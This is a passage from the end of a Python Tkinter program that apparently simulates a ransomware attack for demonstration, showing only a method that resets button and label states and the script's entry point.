        for lbl in self.stage_lbls:
            lbl.configure(fg='#444c56', bg='#21262d')

        self.btn_attack.configure(state='normal')
        self.btn_reset.configure(state='disabled')
        self.btn_backup.configure(state='disabled')
        self.btn_decrypt.configure(state='disabled')
        self.btn_isolate.configure(state='disabled')
        self.btn_export.configure(state='disabled')

        self.threat_var.set('● SYSTEM IDLE')
        self.threat_lbl.configure(fg=self.GREEN)
        self.status_var.set('Ready — click "Launch Ransomware Attack" to begin simulation')


# ─────────────────────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────────────────────
if __name__ == '__main__':
    root = tk.Tk()
    app = CRaaSSimApp(root)
    root.mainloop()
